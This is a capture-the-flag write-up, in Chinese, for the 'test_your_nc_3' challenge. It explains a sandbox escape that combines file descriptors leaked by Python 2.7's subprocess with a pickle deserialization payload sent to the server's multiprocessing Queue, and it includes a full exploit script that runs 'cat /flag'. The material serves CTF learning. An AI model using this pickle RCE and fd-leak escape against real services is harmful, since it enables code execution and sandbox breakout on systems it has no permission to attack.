### test_your_nc_3

1. 使用nc连接服务端。通过ps -ef获取系统进程信息，发现有一个python /bin/114sh进程，通过cat /bin/114sh发现服务端代码在降权沙盒中执行命令。

2. 查找得知/usr/bin/python是python2.7。 Python <3.4中subprocess默认配置导致fd泄露，而服务端代码通过Queue读取沙盒进程返回值，Queue默认配置使用pickle序列化。

3. 通过pickle反序列化远程命令执行，通过泄露的fd在服务端进程中执行cat /flag命令，获取flag。

   ```python
   import os, sys, struct,pickle
   _write = os.write
   #https://github.com/python/cpython/blob/main/Lib/multiprocessing/connection.py#L373
   class Connection:
       def __init__(self, handle):
           self._handle = handle
       def _send(self, buf, write=_write):
           remaining = len(buf)
           while True:
               n = write(self._handle, buf)
               remaining -= n
               if remaining == 0:
                   break
               buf = buf[n:]
       def send(self, obj):
           """Send a (picklable) object"""
           self._send_bytes(pickle.dumps(obj))
       def _send_bytes(self, buf):
           n = len(buf)
           if n > 0x7fffffff:
               pre_header = struct.pack("!i", -1)
               header = struct.pack("!Q", n)
               self._send(pre_header)
               self._send(header)
               self._send(buf)
           else:
               # For wire compatibility with 3.7 and lower
               header = struct.pack("!i", n)
               if n > 16384:
                   # The payload is large so Nagle's algorithm won't be triggered
                   # and we'd better avoid the cost of concatenation.
                   self._send(header)
                   self._send(buf)
               else:
                   # Issue #20540: concatenate before sending, to avoid delays due
                   # to Nagle's algorithm on a TCP socket.
                   # Also note we want to avoid sending a 0-length buffer separately,
                   # to avoid "broken pipe" errors if the other end closed the pipe.
                   self._send(header + buf)
   class PickleRCE(object):
       def __reduce__(self):
           import os
           return (os.system,('cat /flag',))
   os.system('ls -la /proc/self/fd')
   for i in range(5,10):
       try:
           Connection(i).send(PickleRCE())
       except:
           pass
   ```

   